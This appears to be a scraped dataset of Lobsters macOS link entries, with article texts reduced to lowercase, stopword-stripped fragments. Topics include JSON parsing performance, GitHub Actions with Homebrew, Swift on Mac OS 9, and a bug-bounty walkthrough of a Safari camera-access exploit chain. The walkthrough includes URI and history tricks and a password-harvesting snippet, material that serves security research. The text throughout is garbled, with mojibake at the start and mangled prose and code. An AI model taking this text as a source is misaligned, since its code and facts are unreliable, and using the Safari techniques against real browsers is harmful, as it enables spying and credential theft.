â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â stwâ â â â â â â sp â â â â â â â â â â â â â â â â â flag field togglepb put together piece stored stack find later hex written signed occupies top bit lower come next line actual codeâ looking hex editor written right column search string one instance data fork version system file change everything fine â â method fix system seems like small change given stuff change date time control panel would nt great checkbox turn date range enforcement system version control panel â nt one see hard coded clockcdef system version â â system released october almost month superbowl advertisement apple bragged immune thing like bug maybe time interim somebody apple recognized dishonesty commercial maybe whatever reason system flag passed toggledate clockcdef altered way altered system already patched set date however like within limit macintosh system clock good go till bg basalgangster macguicom
84,Lobsters,mac,Apple macOS,"Less Lethargic JSON Support for iOS/macOS, Part 5: Cutting out the Middleman",https://blog.metaobject.com/2020/04/less-lethargic-json-support-for.html,le lethargic json support iosmacos part cutting middleman,result instalment cutting middleman objectbuilder h jsondecoder analysis next step,initially disappointing result trying get faster json processing parsing finally got parity nsjsonserialization le last instalment help mpwsmallstringtable unique string turning object string creation surprisingly expensive even tagged pointer string cutting middleman objectbuilder first instalment series saw could fairly trivially create object plist created nsjsonserialization mpwobjectbuilder h subclass mpwplistbuilder change thing instead creating dictionary creates object instead using setobject forkey set value dictionary us kvc message setvalue forkey vive la petite différence set value object implementation mpwobjectbuilder instancetype initwithclass class theclass self super init selfcache mpwobjectcache class theclass return self void begindictionary self pushcontainer getobject cache void writeobject anobject forkey akey tos setvalue anobject forkey akey well need concern u actual class additional feature nt matter tos instance variable top stack mpwplistbuilder maintains constructing result mpwobjectcache factory creating object let fire see void decodempwdirect nsdata json nsarray key hi comment mpwmasonparser parser mpwmasonparser parser mpwobjectbuilder builder mpwobjectbuilder alloc initwithclass testclass class parser setbuilder builder parser setfrequentstrings key nsarray objresult parser parseddata json nslog mpwmason ld element objresult firstobject objresult count elegant code universe complete parser stretch imagination workable result m shabby slower basensjsonserialization nonrepresentative json file creating final object instead intermediate representation arround faster apple jsondecoder although still mb nowhere near gb also starting close performance level achievable given context basic object creation mostly empty parse analysis next step ignoring triviality actually useful constrained situation array single kind object improve well make faster course let look profile expected kvc code top contributor around total runtime locking function show sibling setvalue forkey almost certainly part implementation slight misattribution time something generally expect aware instrument guessing missing framepointers fomitframepointer nt really feel deep urge investigate nt materially impact outcome analysis guess another point gather enough data inform next step certainly le also see mistake common one definitely making thing fast without enough data matter every project claim high performance without comparative benchmarking simply something author think fast well know extreme le common typically le bad least nt get complete nonsense performance claim backed performance testing running huge battery benchmark every step optimization process probably going get way achieving result yes seen practice
85,Lobsters,mac,Apple macOS,"Equally Lethargic JSON Support for iOS/macOS, Part 4: Our Keys are Small but Legion",https://blog.metaobject.com/2020/04/equally-lethargic-json-support-for.html,equally lethargic json support iosmacos part key small legion,last instalment analysis mpwsmallsstringtable h avoiding allocation frequent string trying next,last instalment started implementing json parser lot good idea dematerialization via property list protocol immediately fell flat face code slower nsjsonserialization worse nt obvious way bulk time spent apple code nobody said going easy analysis let another look profile top consumer cpu setobject forkey string creation dictionary creation message sending nt really know either creating dictionary create setting content string creation although making string creation faster unlikely reduce number string create since json payload consists object né dictionary vast majority string actually going string key come small set known string smallish side particularly former suggests reuse key rather creating multiple new copy usual way look something known key nsdictionary ala would require key look already object meaning would create string object look sting object value rather defeating purpose exercise would need way looking object raw csting unadorned char fortunately required class mpwfoundation little year trump smug face emoticon mpwsmallsstringtable mpwsmallstringtable h class exactly say tin table looking object small string key accessible char length nt want require nul termination addition string object quite bit work went making fast implementation interface hash table compare char directly using indexing bucketing expend little work possible discarding nonmatching string fact since performance primary reason existing unit test include performance comparison nsdictionary nsstring key currently clock faster interface includes two macro objectforstringlength objectforconstantstring need give former length latter figure size compile time using sizeof operator really return length string constant nt use nonconstant string char sizeof return size pointer avoiding allocation frequent string mpwsmallstringtable hand use mpwmasonparser look common string like key without allocating setfrequentstrings method saw declared interface take array string parser turn string table mapping csting version nsstring version void setfrequentstrings nsarray string self setcommonstrings mpwsmallstringtable alloc initwithkeys string value string autorelease method supposed create string object char start follows nsstring makeretainedjsonstringstart const char start length long len nsstring curstr commonstrings nsstring resobjectforstringlength commonstrings start len re return re retain first check common sting table nt find drop code allocated string yeah retain probably questionable though currently necessary trying need tell parser common string ask parse json void decodempwdicts nsdata json nsarray key hi comment mpwmasonparser parser mpwmasonparser parser parser setfrequentstrings key nsarray plistresult parser parseddata json nslog mpwmason ld dicts plistresult firstobject plistresult count seems bit tacky telling json parser expect beforehand least little seems par course whatever fare well faster anywhere fast nsjsonserialization slower good enough result actually bit surprising key created nsjsonserialization mpwmasonparser happen instance nstaggedpointerstring string get allocated heap entire string content cleverly encoded object pointer creating couple shift or apparently take significantly longer lookup likely cf add overhead certainly case original tagged cfnumber shiftor massively faster calling cfnumbercreate next mpwsmallstringtable immediately suggests way tackling expensive part identified profile setobject forkey dictionary creation use string table precomputed key space set object via char key another alternative use mpwxmlattributes class max optimized parsing useonce case however loses sight fact nt actually interested producing plist want create object ideally without creating plist common pitfall see optimization work getting caught detail lot detail tends important one loses sight context big picture speak creating object json done quickly next instalment taste possible set builder nil order see parser create plist result yes probably work work
86,Lobsters,mac,Apple macOS,github actions + homebrew = <3,https://medium.com/@Extrawurst/github-actions-homebrew-%EF%B8%8F-2789ae5023fd,github action homebrew,marketplace action actionsuploadartifact custom action step checkout build step store info using setoutput step create release note step upload archive step bump brew formula http githubcomsettingstokens tl dr extrawurstgituicdyml conclusion,marketplace actionsthe beauty github action marketplace share one written others simplify reuse projectsnaturally expecting able use one found simple enough added realized hood spin docker container based ubuntu would complain building pipeline macos machine afterall want build deploy macos binaryafter digging realised supposed use actionsuploadartifact build stuff mac machine upload artifact downloaded back followup job would distribute homebrew using aforementioned marketplace action sound complicated overkill agreecustom actionturns marketplace github action others work macos builder next implemented hard first step try brew locally create pr bumping formula version brew bumpformulapr f version version nobrowse noaudit hash url url formulathis run macos github worker step workflow file step checkout buildhere see head file run workflow whenever tag pushed use macos machine runon actually build binary leaf build binary targetgituimactargzstep store info using setoutputhere see step first remove refstags ref name get something like need brew formula versioning calculate hash bundle pas homebrew aswell validation store information using setoutput allow using later step workflowstep create releasethis actually creates github release based git tag important note draft draft downloadable public therefore next step fail confusing debug pasting download link browser might work valid github session access upload archivethis step attache archive release us output variable previous step see line bump brew formulathis final bit actually bump homebrew formula create pr tap repository note set specific env variable line create new access token http githubcomsettingstokensthen work come together output variable containing extracted version string hashtl druse output transfer data step see create new access token brew tap pullrequest creation see github release draft download link public see find entire workflow file extrawurstgituicdymlconclusiongithubactions rock homebrew great together match made heaven unfortunate existing marketplace action homebrew using docker therefore linux even though homebrew primarly tool macos need look whether alternative publishing action based docker marketplace
87,Lobsters,mac,Apple macOS,"Somewhat Less Lethargic JSON Support for iOS/macOS, Part 3: Dematerialization",https://blog.metaobject.com/2020/04/somewhat-less-lethargic-json-support_14.html,somewhat le lethargic json support iosmacos part dematerialization,mason max mpwxmlappleproplistreader mpwmaxparser dematerializing property list protocol oriented programming standard object trying,previous instalment looked analysed status quo json parsing apple platform general swift particular nt promising know parsing intermediate representation foundation plist type dictionary array string number one worst possible idea yet fastest know creating object json least slowest part yet far fastest last least also know slowest possible way transfer value object yet swift coding somehow manages several time slower either wrong thing know always distinct possibility something fishy going vote latter figuring exactly fishy thing going would probably fascinating investigation apple performance engineer prefer proof creation make something nt problem case know problem also better alternative use mason without much ado definition mpwmasonparser class class mpwsmallstringtable protocol mpwpliststreaming interface mpwmasonparser mpwxmlappleproplistreader bool indict bool inarray mpwsmallstringtable commonstrings property nonatomic strong id builder void setfrequentstrings nsarray string end send message mpwpliststreaming protocol builder property messageoriented parser jason like max message oriented api xml implementationhistory also reflected fact subclass mpwxmlappleproplistreader subclass mpwmaxparser core implementation loop handle json syntax sends oneway message different element builder look similar loop simple parser probably like crazy simd contortioins simdjson done return whatever builder constructed parseddata nsdata jsondata self setdata jsondata const char curptr jsondata byte const char endptrcurptr jsondata length const char stringstartnull nsstring curstrnil curptr endptr switch curptr case builder begindictionary indictyes inarrayno curptr break case builder enddictionary curptr break case builder beginarray indictno inarrayyes curptr break case builder endarray curptr break case parsestring curptr endptr stringstart curptr curstr self makeretainedjsonstringstart stringstart length curptrstringstart curptr curptr builder writekey curstr curptr else builder writestring curstr break case curptr break case case case case case case case case case case case bool isrealno const char numstartcurptr id numbernil curptr curptr curptr endptr isdigit curptr curptr curptr curptr curptr endptr isdigit curptr curptr isrealyes curptr endptr curptr e curptr e curptr curptr endptr isdigit curptr curptr isrealyes number isreal self realelement numstart length curptrnumstart self integerelementatptr numstart length curptrnumstart builder writestring number break case endptrcurptr strncmp curptr true builder pushobject truevalue break case f endptrcurptr strncmp curptr false return false builder pushobject falsevalue break case n endptrcurptr strncmp curptr null builder pushobject nsnull null break case case n curptr endptr isspace curptr curptr break default nsexception raise invalidcharacter format json invalid character x c td curptr curptr curptr char data byte break return builder result almost certainly nt correctly handle edgecases unlikely impact overall performance dematerializing property list mpwpliststreaming mentioned mason messageoriented main purpose sending message mpwpliststreaming protocol builder protocol protocol mpwpliststreaming void beginarray void endarray void begindictionary void enddictionary void writekey akey void writestring astring void writenumber anumber void writeobject anobject forkey akey void pushcontainer anobject void pushobject anobject end enables using property list intermediate format without actually instantiating instead sending message would sent property list protocol oriented programming anyone oh forgot swift protocol also used output side get something like standard object trying default mpwmasonparser set builder instance mpwplistbuilder name hint build property list like nsjsonserialization let give whirl void decodempwdicts nsdata json mpwmasonparser parser mpwmasonparser parser nsarray plistresult parser parseddata json nslog mpwmason ld dicts plistresult firstobject plistresult count time drumroll second hmm disappointing nt anything wrong yet almost slower nsjsonserialization well dang apple engineer know probably give well fast let least check wrong unleash cracken er instrument interesting vast majority time actually spent apple code building plist build plist nsjsonserialization get job done faster last checked nspropertylistserialization close enough actually use specialised corefoundationbased dictionary optimized case lot string key one place initialization exposed corefoundation cbased mean nonexposure effective apparently apple stopped opensourcing cflite ago better tune next exciting instalment
88,Lobsters,mac,Apple macOS,"Somewhat Less Lethargic JSON Support for iOS/macOS, Part 2: Analysis",https://blog.metaobject.com/2020/04/somewhat-less-lethargic-json-support_12.html,somewhat le lethargic json support iosmacos part analysis,part status quo simdjson mason,part status quo saw something nt quite right json procsesing apple land something like simdjson accomplish basic parsing task rate gb creating object happens equivalent rate mb swift json codable support manages measly mb underperforming macbook pro built ssd least gigabit network connection still factor feedback got indicated implication data presented status quo clear little analysis dive code messagepack decode pure swift codable decoder slow make rest graph almost unreadable included comparison actually json decoder let leave addition let show much time result underlying parser much time spent object creation chart immediately lay rest two common hypothesis performance issue swift codable object creation yes object creation slow compared many thing represents around total runtime yes finding way reduce final would also cool watch space tackling first fact using nsjsonserialization therefore objectivec hood make slow yes parsing something dictionarybased representation expensive final representation ideal avoided one thing however nsjsonserialization part decoding make running time remaining swift decoder part turning dictionary object using keyvaluecoding slowest imaginable mechanism getting data object deliberately adding rubegoldberg element add basic nsjsonserialization parse json dictionary time parse dictionaies pure object creaton time still le codable overhead pure swift parser also slow slower also show stjson contender ever claimed slower even swift jsondecoder without actually going full object jason significantly faster also nt go object going object still significantly slower nsjsonserialization really leaf nsjsonserialization variant useful comparison point come rest either slow nt need see fairly clearly creating object instead dictionary would better better creating dictionary certainly much better first creating dictionary object nt obvious also clear actual parsing json text nt add much extra overhead relative creating dictionary fact adding copy convert mutable dictionary immutable dictionary appears take time parse truth actually quite way far know nsjsonserialization like companion nspropertylistserialization us special dictionary cheaper create textual representation simdjson mind clear simdjson although would likely take pure parse time around m interesting lest stage optimizes part already take least time already overwhelmed even small change way create object also mean simdjson useful nt make object creation slower also lesson learned creating max xml parser ca nt make xml parser part fast possible sometimes make sense make parser somewhat slower mean part object creation significantly faster generally enough fast component play well together optimization system architecture want well mason next installment start looking actual parser
89,Lobsters,mac,Apple macOS,"Somewhat Less Lethargic JSON Support for iOS/macOS, Part 1: The Status Quo",https://blog.metaobject.com/2020/04/somewhat-less-lethargic-json-support.html,somewhat le lethargic json support iosmacos part status quo,simdjson environmental assumption constraint nsjsonserialization nsjsonserialization swift json coding third party json parser jason stjson zippyjson flightschool max mason max superconvenient mpwmasonparser,finished watching daniel lemire talk current iteration simdjson json parser clock following daniel work time ca nt really recommend highly enough video reminded recent twitter conversation offered contribute fast swiftcompatible json parser loosely based max fast convenient xml parser due various factor control ca nt really offer anything fast compared simdjson manage something quite bit le lethargic currently offer apple particularly swift world environmental assumption constraint first assumption going operate apple ecosystem simplicity sake going use macos next assume want parse r domain object processing within application structs difference important context going use following class mix integer string instance variable swift objc class testclass nsobject codable let hi int let int let comment string objectivec interface testclass nsobject property nonatomic long hi property nonatomic strong nsstring comment end make easy measure going use one million object going initialise increasing integer constant string comment yield json file different serialisation method correctly parsed parser tested obviously simple class file structure think give reasonable approximation realworld use first thing check quickly create object straight code without parsing give u good upper bound performance achieve parsing domain object define count void createobjects nsmutablearray objresult nsmutablearray arraywithcapacity int count testclass cur testclass new curhii curtherei curcomment comment objresult addobject cur nslog created object code wo parsing ld object objresult objresult count quad core mbp run second although nt actually parsing would mean creating object would result parsingg json file would yield rate mb wait second almost slower daniel lemire parser one actually par json creating object would result parsing without actual parsing one many unintuitive aspect parsing performance actual lowlevel characterlevel parsing generally least important part overall performance unless something crazy like use nsscanner nt use nsscanner please one reason unintuitive learned performance dominated innermost loop character level processing innermost loop magnitude performance difference inner outer loop differ le amount stuff happennnig outer loop dominate nsjsonserialization apple json story much revolves around nsjsonserialization much like rest serialization story revolves around similar nspropertylistserialization class reasonable quick implementation turning mb json file nsarrray nsdictionary instance second called objectivec rate mb swift take second mb course get u property list array dicts case domain object actually want read book mention book oh think know type dictonary representation fairly expensive expensive create expensive term memory consumption expensive access creating dictionary equivalent object created take second around time creating equivalent object rate mb relative mb json file void createdicts nsmutablearray objresult nsmutablearray arraywithcapacity int count nsmutabledictionary cur nsmutabledictionary dictionary cur hi cur cur comment comment objresult addobject cur nslog created dicts code wo parsing ld object objresult objresult count creating dict single step using dictionary literal significantly faster creating immutable copy mutable dict done filling brings time half second getting dicts object typically straightforward tedious fetch entry dictionary call corresponding setter value thus retrieved dictionary nt production code trying get bound possible easier way use key value coding key found dictionary combined code parsing creating object shown void decodensjsonandkvc nsdata json nsarray key hi comment nsarray plistresult nsjsonserialization jsonobjectwithdata json error nil nsmutablearray objresult nsmutablearray arraywithcapacity nsdictionary plistresult testclass cur testclass new nsstring key key cur setvalue key forkey key objresult addobject cur nslog nsjsonkvc ld object objresult objresult count note kvc slow really slow orderofmagnitude slower sending message kind slow significant impact total time come total second including parsing object creation shy mb swift json coding first couple release swift json support apple limited wrapped nsjsonserialization slight performance penalty already noted write book see sidebar many json parser published none notable exception big nerd ranch freddy actual par transformed array dictionary returned nsjsonserialization swift object performance abysmal around overhead addition basic nsjsonserialization parse apple swift codable promised solve convenience front certainly great job func readjsoncoder data data testclass nslog swift decoding let coderjsondecoder let arraytry coderdecode testclass self data return array forcing test code please nt production ala performance still great second mb slower basic nsjsonserialization parse slower slow simple complete parse via nsjsonserialization kvc however significantly faster previous thirdparty json swift object parser tune old first mark discount sale trick applied performance except relative number larger third party json parser looked little third party json parser particularly jason stjson zippyjson sttjson make claim speed manages clock second mb jason bill faster json parser compare swiftyjson reasonably well second mb however parse internal representation domain object structs compared nsjsonserialization point disappoint probably interesting zippyjson us daniel lemire simdjson codable compatible ala could nt get zippyjson compile nt number keep trying claim around faster apple jsondecoder would make parser least ballpark trivial nsjsonserialization kvc method showed another interesting tidbit come zippyjson readme heading much faster apple version first convert json nsdictionary using nsjsonserialization afterwards make thing swifty creation intermediate dictionary expensive true first converting intermediate representation slow particularly one heavyweight property list however primary reason creating expensive representation take total running time codable apparently talking speaking slowly corroborate also tried flightschool implementation codable messagepack obviously use nsjsonserialization make performance claim take second decode object used json file course different file mb size normalized mb file would mb max mason leave u considering simdjs show theoretically possible json parsing good place put mildly gb v mb apple jsondecoder several time slower nsjsonserialization nt exactly speed daemon around slower pure object creation comically bad might another way putting least entertained contribute well xml result wasis max messaging api xml parser superfast though simd also present apis make superconvenient also superfast go directly xml objectrepresentation either tree stream domain object using mostly constant memory mentioned book yeah book gory detail anyway xml sorta faded question whether technique would work json parser answer yes roughly though added complexity le convenience json le informative file format xml open closetags really give good headsup coming goal produce domain object close theoretical maximum slightly mb possible time making parser convenient use close swift codable convenience wo nt support codable per default overhead seem high zippyjson suggests adapter would nt hard parser mpwmasonparser nt done yet initial state par json dictionary second mb slightly slower nsjsonserialization bit way go come join little parsing performance journey
91,Lobsters,mac,Apple macOS,The Case for Apple to Postpone macOS 10.16 into 2021,https://www.macobserver.com/columns-opinions/editorial/postpone-macos-10-16-till-2021/,case apple postpone macos,wwdc reason reason reason reason,imac image credit appletraditionally apple provides preview next version macos wwdc june release late september year case made postpone macos user struggling stay safe secure macos catalina even mojave since new apps pressed service working home last thing need new version macos traditional teething post wwdc beta need rug pulled collaboration apps let focus stability security pandemic completely dissipatedreason apple software engineer guessing many macos engineer working home traditional high level collaboration like apple office corner might cutplus working home would harder alpha test complete suite test mac supported thing inevitably fall crack time cut corner macos pressed service home mission critical lifelinereason apple developer developer hero complaining year keep fastevolving structural security change macos every month six month delay would provide critical time iron kink apps due change catalina mention relaxing stress developer due concern family healthreason internet load new version macos run gb million user developer downloading beta final version throughout summer internet bandwidth crucial may still working home seems unwiseof course pandemic may mostly point summer want hazard guess medical pro time apple plan wwdc curriculum make worst case estimate plan accordingly keep security update coming know could use macos breathing room stress relief
92,Lobsters,mac,Apple macOS,A walkthrough of getting unauthorized camera access in Safari,https://www.ryanpickren.com/webcam-hacking,walkthrough getting unauthorized camera access safari,bugpoc camera security model mediadevices webrtc mediadevices secure context perwebsite basis origin generic uri syntax hard bugpoccompoc bugpoc tangled web generic uri syntax spec mucking parent type windowhistory explicitly prohibit origin inherit origin opener webkit bug report bizarre variation file uri broken browser bugpoc mock endpoint bugpoccompoc spec serialized effective domain opaque origin origin serialization standard bugpoccompoc bpwkiedjre http examplecom locationreplace windowhistory spec hotly debated browser dependent sandboxed iframe,post contains real bugpoc link used report bug apple download safari want check live demo apple used reproduce issuesbackgroundthe goal project hack iosmacos webcam vulnerability uncovered hunt bonus bug jump want start quote old colleague mine bug hunting finding assumption software violating assumption see happens precisely going today going dive murky depth safari hammer browser obscure corner case uncover weird behavior quirk collect enough quirk tie together full kill chainthe camera security model io macos pretty intense nutshell app must explicitly granted cameramicrophone permission handled o via standard alert boxbut exception rule apple apps get camera access free mobile safari technically access camera without asking furthermore new web technology mediadevices web api commonly used webrtc transmission allow website utilize safari permission access camera directly great webbased video conferencing apps skype zoom new webbased camera tech undermines o native camera security model paper titled study webrtc security put conundrum nicely user chooses suitable browser know trust webrtc communication considered secure word level trust provided user webrtc directly influenced user trust browser question iosmacos user must ask much trust safari quick side note get going encryption mandatory feature webrtc enforced exposing mediadevices api website deemed secure context mean even awesome uxss bug like unable get camera access camera protected deep gut safarisome quick research show safari keep track permission setting perwebsite basis let website access sensitive content gps location camera without always asking permission basically allow skype access camera whenever want trust skype see website currently trust safari preference websitesthis feature essentially required safari reimplement security model scratch context natural question model brings well safari keep track website beginning form attack plan somehow trick safari thinking evil website secure context trusted website leverage safari camera permission access webcam via mediadevices apikeeping track websitesin order safari use website setting course need know website currently viewing abstractly actually fundamental responsibility browser core upholding sameoriginpolicy trying trick browser failing responsibility key uxss sop bypass exploit minute playing around noticed something strange safari seemed use origin keep track currently open website fact method keeping track website quite bizarrein example browser window unique origin however safari seems think website open experimentation deduced safari likely running generic uri syntax parser open window get uris hostnames extra parsing specifically safari seems remove www start hostnames super interesting know parsing url hardafter light hostname fuzzing noticed weird quirk hostnames dash period touching ie completely invisible safari currently open website feature unable immediately figure use quirk get camera still interesting observation sort unnerving http fooevilcom would missing menu working demo bugpoc bugpoccompoc password note demo work viewed using safari bugpoc super useful demonstration purpose let instantly create custom subdomain hosting html code nifty important observation url scheme completely ignored problamatic scheme contain meaningful hostname file javascript data scheme contain hostname within embedded uri tangled web dubbed encapsulating pseudo protocol viewsource blob able simply grab string treat valid hostname bad assumption safari retrospect safari kept whitelist scheme parsed like http http w etc time find way exploit faulty assumption let start playing pseudoprotocolsthe usual suspectsthe goal create uri parsed using generic uri syntax defined rfc produce arbitrary hostname trusted victim easy right obvious place start javascript data tl dr none worked dont like story dead end recommend jump next section javascript really hopeful one javascript skypecom trick right hostname seen safari context skypecom wrong turn safari attempt open url page actually load blank content sent directly javascript engine without touching url bar word windowlocationhref actually equal javascript skypecom view page tried handful way halt page loading trick safari giving href however none successful moving data next data goal create uri valid parsed rfc data rfc oldschool authority uris polyglot url testing came data skypecom opened page using standard windowopen checked safari preference safari think skypecom currently open success problem technically valid data uri mimetype recognizable safari browser spec dictate default mimetype textplain mean data skypecom script alert script produce harmless text file safari might confused looking file anything evil without javascript execution safari follows modern best practice giving every data uri unique origin dynamically populate document javascript post rendering w open data skypecom wdocumentwrite script alert script securityerrorbummer isolated origin protection actually developed prevent new document mucking parent vice versa technically thwart type attack tried handful different way tricking safari rendering textplain data uri html none successful perhaps one day type anchor tag attribute ever get implemented taking closer look safari internally parsing url decided give windowhistory try perhaps could start html data uri alter pathname skypecom without actual page loading navigation thus mimetype updating unfortunately u rfc god sortof saw coming explicitly prohibit using historypushstate historyreplacestate change origin note spec reference true algorithmic definition origin classic schemehostport tuple case data uri historyreplacestate would change origin opaque origin opaque origin b buenohistoryreplacestate data skypecom securityerrorabout last shortlist one seemed surprisingly fruitful skypecom actually accepted safari something like chrome error however unable dynamically populate document w open skypecom wdocumentwrite script alert script securityerrorit seems safari allows blank srcdoc inherit origin opener found old webkit bug report considered loosening restriction dice skypecom get unique opaque origin like data also mean historypushstate shenanigan also blocked file rescuethe next scheme started messing around file scheme contain meaningful hostname right digging deep rfc rabbit hole actually stumbled upon bizarre variation file uri contain hostname type uri actually specifies remote server similar ftp however retrieval mechanism file stored remote machine defined specification searching interwebs unable find user agent actually support obscure uri typefile hostexamplecomsharepathtofiletxtpretty funky curiosity checked safari internally par normal file uria expected hostname blank decided go ahead specify host using javascript see happenswhat hell page actually accepted uri valid reloaded content mean changed documentdomain using really dumb trick sure enough safari think skypecom load evil javascript camera microphone screen sharing compromised open local html file bonus safari also seems use lazy hostname parsing method fill autocomplete password steal plaintext password accept autocomplete script locationhost googlecom locationhost googlecom else alert documentdomain script hunt right wrong hack required victim open local html file better plus work io local file downloaded via mobile safari get shown previewstyle embedded view without javascript engine let keep looking bonus bug autodownloadsin attempt make file hack realistic decided look could trick safari automatically downloading malicious html file website course downloading file half battle victim still need open remembered reading simple referer header spoofing bug edge broken browser ago turn similar technique could used easily bypass autodownload prevention safari open trusted website popup reuse popup download link used bugpoc mock endpoint feature make url contentdisposition attachment response header containing small text file demo bugpoc demo bugpoccompoc password note demo work viewed using safari ok back camera hunt blob weirdnessthe blob encapsulating pseudo protocol interesting tool let directly access file tucked away browser memory using random identifier let easily reference file create fly type uris typically used image video however interesting feature actually allow specify mimetype safari even try best render anything make html document open new tabblob new blob hello world type texthtml url urlcreateobjecturl blob open url blank blob dictate algorithm browser must use generate neat uris tl drblob origin creating document random uuid subtlety algorithm worth calling origin serialized string happens origin making blob uri meaningful serialization like null effective domain document opaque origin quick reminder opaque origin like one given data texthtml foo foo always get serialized string null serialization meaning internally safari treat data texthtml foo data texthtml bar two unique origin even though become null stringified well spec say browser figure one serialized null set implementationdefined value got ta love ambiguity spec let see safari handle odd case start data uri give ourself opaque origin data texthtml foobar create blob uriinteresting serialized origin blob uri literally string null like print console serialization definition curious safari would know opaque origin allowed open uri experimenting determined safari fact enforce sop must using random uuid help find true creating origin opening blob uri using javascript creating document worked expected new document able inherit opaque origin rfc god always wanted attempting use javascript open uri different opaque origin resulted error also expected noticed something weird manually typing url safari address bar gave origin appeared blank origin safari thought appropriate give opaque origin created document fact according origin serialization standard opaque origin result blank scheme blank host blank port run algorithm going forward refer bizarre origin magical blank origin playing around discovered nullbloburi inherits origin opener catch safari check make sure opener allowed open url first thus upholding sop mess opener normal document working demo bugpoc bugpoccompoc bpwkiedjre password note demo work viewed using safari accessing uri bookmark caused really bizarre behavior see safari attempt grant nullbloburi http examplecom origin however fails actually document stored memory location hence webkitblobresource error safari apparently able find document opener blank origin evidently stumbled upon bizarre origin equivalent null context technically opaque needed type nullbloburi address bar manually get need find way programmatically get magic blank origin basically method simulating manual address bar entry luckily api locationreplace api replaces current resource url originally navigated remember safari check make sure permission view url location replacing need come document created url new blob hello world type texthtml url urlcreateobjecturl blob locationreplace url nice successfully hopped data uri opaque origin blob uri blank origin historyback tried use windowhistory muck data uris unsuccessful changing pathname inadvertently changed opaque origin behavior explicitly disallowed history spec let see anything different longer opaque origin quick reminder look like point try something pretty aggressive historypushstate blob skypecom securityerrorbummer appears safari correctly realizes pushstate would send u new origin noticed something really strange pushstates allowed historypushstate blob historypushstate skypecom locationhref blob skypecomwhat going behavior disallowed tried one fell swoop totally fine break well step determine blob uris origin found best guess safari correctly think origin blob skypecom new opaque origin step spec reason considers origin blob calling blank origin step spec fixed part current origin also pushstate permitted next pushstate change pathname safari nt see problem like locationhref blob skypecom quick check safari preference show skypecom currently open website finally done however autodownloads autopopups autocomplete plaintext password good stuff webcam let keep tryingsecure context without tl secure context window worker reasonable confidence content delivered securely via httpstls potential communication context secure limited many web apis feature accessible secure context primary goal secure context prevent maninthemiddle attacker accessing powerful apis could compromise victim attack ok understandable requirement use webrtc would pretty scary anybody wifi could access webcam assuming visiting http website youve previously trusted time find new bug circumvent requirement digging deep secure context spec noticed contradiction browser permitted also treat file url trustworthy convenient developer building application deploying public curious safari implemented exception started exploring make file url unique sop rule around protocol hotly debated time origin url browser dependent modern version safari give file separate opaque origin experimentation discovered safari lazily treat document opaque origin secure context really big oversight easy http site create opaque origin document one obvious way sandboxed iframe iframe src sandbox iframe issue spec say page secure context page along parent opener chain must delivered securely mean opaque origin document embedded http website ultimately considered insecurelucky u safari seemed ignore opener chain part spec check parent secureness let u simply open popup within sandboxed iframe make secure context window
93,Lobsters,mac,Apple macOS,Swift on Mac OS 9,https://belkadan.com/blog/2020/04/Swift-on-Mac-OS-9/,swift mac o,april fool day anniversary founding apple inc current event world best code visualizer swift mac o powerpc classic environment wine crossover virtualbox parallel carbon sound familiar core foundation provide common interface carbon cocoa marshall elfstrand goal swift write program swift run mac o want build ppccapable swift compiler also need emulator copy macintosh programmer workshop tool want prebuilt ppccapable swift toolchain ppcswifttoolchain also need emulator copy macintosh programmer workshop tool ppcswiftproject want try built version bitpaint bitpaintswifthqx gathering material codewarrior macintosh programmer workshop written experience blog post part part debug mystery misbehavior sheepshaver modern compiler classic linker llvm ibm reference doc adding support aix o apple ibm used close partnership along motorola aix register convention stack convention mac o runtime architecture swift teach swift ppcaix target add support pascal string hacked swift well turn reflection support nearly runtime metadata learn make smol stdlib ppcswiftproject might good reference someone looking ccompatible runtimeless subset swift disable jump table jump table swift llvmproject week mysterious failure mac o runtime architecture mac o runtime architecture sheepshaver already know load future direction macroman linkage summary april technical swift mac o classic compiler,april mean april fool day anniversary founding apple inc year sober one due current event think lot people still appreciate people creating sharing keep spirit whether music art programming project prank april fool seem le le fun obvious joke whimsy anyone expense still something believe even better actually work last year implemented world best code visualizer year decided seriously attempt something thought past getting swift program run mac o mac o twenty year ago macos know today another operating system known mac o one first os use gui something pretty much take granted day also date day one program could run time even latest version us cooperative multitasking run multiple program yield time let others run program crashed overwrote memory supposed good chance restart whole system mac o ran powerpc processor also used gamecube xbox earlier version o started motorola cpu series successor mac o x also ran powerpc first launched apple began switch intel processor instead powerpc finally dropped mac o x huge step forward mac o number way including preemptive multitasking could actually run multiple thing apple want leave o program behind two thing classic environment set sandbox looked enough like mac o run classic mac o program directly mac o x classic environment app program ran inside protected interfering mac o x program vice versa really quite effective actually survived longer booting mac o never received support newer powerpc processor life ended switch intelpowered built running instruction original apps directly provide compatibility shim library think like wine crossover rather virtualbox parallel carbon packagedup version old mac o toolbox apis could write mac o x apps way always basically recompiled app added extra annotation saying carbonized sound familiar fun aside reason one reason core foundation provide common interface carbon cocoa ht marshall elfstrand video link classic ended switch intel processor back carbon worked way last year macos mojave apple never released version carbon presumably encourage developer move cocoa last year macos catalina support apps dropped entirely exception goal since learned program classic mac o year later spent good chunk career working swift tantalizing thought like write program swift run mac o write swift source code call carbon toolbox apis compile powerpc version swift compiler package necessary mac o profit useful absolutely neither yet still learned lot probably guessed managed accomplish writing blog post without ado picture swift toolbox app running mac o friend nadine power mac check blazing fast processor assume good number people reading would like know want build ppccapable swift compiler check following repository git clone http belkadancomsourceppcswiftproject cd ppcswiftproject git clone b ppcswift http belkadancomsourceswift git clone b ppcswift http belkadancomsourcellvmproject git clone http githubcomappleswiftcmark cmark make quick start build swiftc strippeddown stdlib note directory branch name subrepos note nested inside ppcswiftproject repo also need mpw emulator copy macintosh programmer workshop tool build actual app using modern macos want prebuilt ppccapable swift toolchain one ppcswifttoolchain note put built swifto toolchain probably success optimized code actually remaining link stdlib ie everything inlined away also need mpw emulator copy macintosh programmer workshop tool may still want check example ppcswiftproject repo required flag swiftc ppclink rez little finicky note size carb resource required carbon app skip rez part actually want run app want try built version bitpaint one bitpaintswifthqx like hear anything make tool meanwhile like hear made work read gathering material last time building classic mac o apps using codewarrior actually calling building classic mac o apps stretch learning c using codewarrior terminal io library get stdinstdout interface classic mac o natively remember command line could try get version codewarrior running seem like convenient thing think able get swift compiler running classic shuttling object file back forth os get anything done fortunately one interested building classic apps modern macos point found mpw project emulator specifically running apple macintosh programmer workshop tool knew going work steve troughtonsmith famous apple community finding undocumented prerelease feature apple os written experience building app mpw ran system way modern mac o x building appropriate compiler appropriate library interested highly recommend checking blog post reference used get started app see running picture bitpaint troughtonsmith test app ported swift ask 